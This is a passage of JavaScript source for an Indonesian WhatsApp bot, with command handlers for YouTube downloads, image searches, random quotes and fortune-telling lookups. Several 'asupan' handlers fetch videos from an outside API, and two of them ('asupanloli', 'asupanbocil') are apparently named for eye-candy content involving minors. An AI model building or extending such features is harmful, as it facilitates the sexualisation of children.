title: a.title, description: `❏ *Channel* : ${a.author.name} | ❏ *Durasi* : ${a.duration}`, rowId: `${prefix}ytmp3 ${a.url}`
})
}
const button = {
title: `${q}`,
description: "Silahkan Tap Tombol Dibawah!",
footerText: `© Dani Uhhuy`,
buttonText: 'Klik Here',
listType: 'SINGLE_SELECT',
sections: [
{
title: "Hasil Pencarian", 
rows: list_rows
}
]
}
const templateList = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ "listMessage": button }), {});
Dani.relayMessage(m.chat, templateList.message, { messageId: templateList.key.id });
limitAdd(sender, limit)
}
break
case 'google': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `「 *GOOGLE* 」\n\n`
for (let g of res) {
teks += `❏ *Title* : ${g.title}\n`
teks += `❏ *Description* : ${g.snippet}\n`
teks += `❏ *Link* : ${g.link}\n\n\n\n`
} 
textImg(teks)
limitAdd(sender, limit)
})
}
break
case 'gimage': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `gimage ${text}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `「 *GOOGLE IMAGE* 」

❏ *Query* : ${text}
❏ *Media Url* : ${images}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
})
}
break
case 'play': case 'ytplay': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '🎵AUDIO'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '🎥VIDEO'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `❏ *Y O U T U B E P L A Y* ❏

❏ *Title* : ${anu.title}
❏ *ID* : ${anu.videoId}
❏ *Duration* : ${anu.timestamp}
❏ *Viewers* : ${anu.views}
❏ *Upload At* : ${anu.ago}
❏ *Author* : ${anu.author.name}
❏ *Channel* : ${anu.author.url}
❏ *Description* : ${anu.description}
❏ *Url* : ${anu.url}

_Silahkan Pilih Media Di Bawah_`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'ytmp3': case 'ytaudio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let { yta } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
Dani.sendImage(m.chat, media.thumb, `❏ *Title* : ${media.title}\n❏ *File Size* : ${media.filesizeF}\n❏ *Url* : ${isUrl(text)}\n❏ *Ext* : MP3\n❏ *Resolusi* : ${args[1] || '128kbps'}`, freply)
Dani.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'ytmp4': case 'ytvideo': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let { ytv } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
Dani.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `❏ *Title* : ${media.title}\n❏ *File Size* : ${media.filesizeF}\n❏ *Url* : ${isUrl(text)}\n❏ *Ext* : MP4\n❏ *Resolusi* : ${args[1] || '360p'}` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'getmp3': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let { yta } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(urls[text - 1], quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
Dani.sendImage(m.chat, media.thumb, `❏ *Title* : ${media.title}\n❏ *File Size* : ${media.filesizeF}\n❏ *Url* : ${urls[text - 1]}\n❏ *Ext* : MP3\n❏ *Resolusi* : ${args[1] || '128kbps'}`, m)
Dani.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
limitAdd(sender, limit)
}
break
case 'getmp4': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let { ytv } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
Dani.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `❏ *Title* : ${media.title}\n❏ *File Size* : ${media.filesizeF}\n❏ *Url* : ${urls[text - 1]}\n❏ *Ext* : MP4\n❏ *Resolusi* : ${args[1] || '360p'}` }, { quoted: m })
limitAdd(sender, limit)
}
break
case 'pinterest': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let { pinterest } = require('./lib/scraper')
let anu = await pinterest(text)
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `pinterest ${text}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: result },
caption: `「 *PINTEREST* 」\n\n❏ *Title* : ${text}\n❏ *Url* : ${result}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'konachan': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let buttons = [
{buttonId: `konachan ${text}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: `${webdani}/api/search/konachan?query=${text}&apikey=${daniapi}` },
caption: `「 *KONACHAN* 」\n\n❏ *Title* : ${text}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'alphacoders': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let buttons = [
{buttonId: `alphacoders ${text}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: `${webdani}/api/search/alphacoders?query=${text}&apikey=${daniapi}` },
caption: `「 *ALPHACODERS* 」\n\n❏ *Title* : ${text}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'couple': case 'ppcp': case 'ppcouple': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Dani.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: freply })
Dani.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: freply })
}
break
case 'wallpaper': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let { wallpaper } = require('./lib/scraper')
let anu = await wallpaper(text)
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `「 *WALLPAPER* 」\n\n❏ *Title* : ${result.title}\n❏ *Category* : ${result.type}\n❏ *Detail* : ${result.source}\n❏ *Media Url* : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'wikimedia': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.apkk
sticWait(from)
let { wikimedia } = require('./lib/scraper')
let anu = await wikimedia(text)
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wikimedia ${text}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: result.image },
caption: `「 *WIKI MEDIA* 」\n\n❏ *Title* : ${result.title}\n❏ *Source* : ${result.source}\n❏ *Media Url* : ${result.image}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'quotesanime': case 'quoteanime': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let { quotesAnime } = require('./lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `quotesanime`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 2
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break        
case 'pantun': case 'nickff': case 'fml': case 'truth': case 'dare': case 'motivasi': case 'quotespubg':  case 'quotesislamic': case 'katailham': case 'katagalau': case 'katabijak':  case 'faktaunik': case 'puisi': case 'katahacker': case 'katasindiran': case 'katacinta': case 'katasenja': case 'katabucin': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let anu = await fetchJson(`${webdani}/api/randomtext/${command}?apikey=${daniapi}`)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
text: anu.result,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 2
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'quotes': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
let anu = await fetchJson(`${webdani}/api/randomtext/quotes?apikey=${daniapi}`)
let buttons = [
{buttonId: `quotes`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
text: `❏ *Author* : ${anu.result.author}\n❏ *Quotes* : ${anu.result.quotes}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 2
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'cerpen': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let anu = await fetchJson(`${webdani}/api/movie/cerpen?apikey=${daniapi}`)
let buttons = [
{buttonId: `cerpen`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
text: `❏ *Judul* : ${anu.result.Judul}\n❏ *Penulis* : ${anu.result.Penulis}\n❏ *Sumber* : ${anu.result.sumber}\n❏ *Cerita* : ${anu.result.cerita}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 2
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'ceritahoror': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let anu = await fetchJson(`${webdani}/api/movie/ceritahoror?apikey=${daniapi}`)
let buttons = [
{buttonId: `ceritahoror`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: anu.result.thumb },
caption: `❏ *Judul* : ${anu.result.judul}\n❏ *Desc* : ${anu.result.desc}\n❏ *Story* : ${anu.result.story}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupan': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupan`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupanukhty': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupanukhty`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan/ukhty?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupanrikagusriani': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupanrikagusriani`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan/rikagusriani?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupannotnot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupannotnot`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan/notnot?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupanloli': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupanloli`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan/loli?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupankayes': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupankayes`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan/kayes?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupanhijaber': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupanhijaber`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: `${webdani}/api/asupan/hijaber?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupanbocil': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupanbocil`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan/bocil?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asupangeayubi': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
sticWait(from)
let buttons = [
{buttonId: `asupangeayubi`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/asupan/geayubi?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'nomerhoki': case 'nomorhoki': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!Number(text)) throw `Example : ${prefix + command} 6285714627920`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nomor HP :* ${anu.message.nomer_hp}\n❏ *Angka Shuzi :* ${anu.message.angka_shuzi}\n❏ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n❏ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, freply)
limitAdd(sender, limit)
}
break
case 'artimimpi': case 'tafsirmimpi': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Ketemu Kamu ><`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Mimpi :* ${anu.message.mimpi}\n❏ *Arti :* ${anu.message.arti}\n❏ *Solusi :* ${anu.message.solusi}`, freply)
limitAdd(sender, limit)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 25, 10, 2005, Asfi, 16, 11, 2007`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama Anda :* ${anu.message.nama_anda.nama}\n❏ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❏ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❏ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 7, 7, 2005, Asfi, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama Anda :* ${anu.message.nama_anda.nama}\n❏ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❏ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❏ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'suamiistri': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 7, 7, 2005, Asfi, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama Suami :* ${anu.message.suami.nama}\n❏ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n❏ *Nama Istri :* ${anu.message.istri.nama}\n❏ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'ramalancinta': case 'ramalcinta': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 7, 7, 2005, Asfi, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama Anda :* ${anu.message.nama_anda.nama}\n❏ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❏ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❏ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❏ *Sisi Positif :* ${anu.message.sisi_positif}\n❏ *Sisi Negatif :* ${anu.message.sisi_negatif}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'artinama': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Ahmad Dani`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama :* ${anu.message.nama}\n❏ *Arti :* ${anu.message.arti}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'kecocokannama': case 'cocoknama': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
